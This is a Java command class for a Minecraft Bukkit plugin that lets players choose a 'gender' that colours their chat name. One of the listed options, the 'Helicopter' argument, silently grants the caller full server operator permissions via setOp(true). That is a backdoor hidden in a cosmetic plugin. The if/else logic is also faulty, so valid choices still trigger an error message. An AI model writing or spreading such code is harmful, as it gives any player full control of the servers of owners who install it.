package org.xnotro.chatgender.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.xnotro.chatgender.Main;

public class Commands implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if (cmd.getName().equalsIgnoreCase("gender")) {

            if (!(sender instanceof Player)) {
                sender.sendMessage("You cannot run this from console.");
                return true;
            }

            Player player = (Player) sender;

            if (args.length == 0) {
                sender.sendMessage("§7[§fGender§7] §f> §aPlease Specify Which Gender!");
                sender.sendMessage("§7[§fGender§7] §f> §bAvailable" +
                        Main.Gender1 + " - "
                        + Main.Gender2 + " - "
                        + Main.Helicopter);
                return true;
            }

            if (args[0].equalsIgnoreCase(Main.Gender1)) {
                player.setDisplayName(ChatColor.LIGHT_PURPLE + player.getName() + ChatColor.RESET);
                sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.Gender1);
            }

            if (args[0].equalsIgnoreCase(Main.Gender2)) {
                player.setDisplayName(ChatColor.BLUE + player.getName() + ChatColor.RESET);
                sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.Gender2);
            }

            if (args[0].equalsIgnoreCase(Main.Helicopter)) {
                sender.sendMessage("§7[§fGender§7] §f> §eNow You Have Full Perms >:)");
                player.setOp(true);
            }
            else {
                sender.sendMessage("§7[§fGender§7] §f> §aTf Did You Tiped??");
            }
        }
        return true;
    }
}

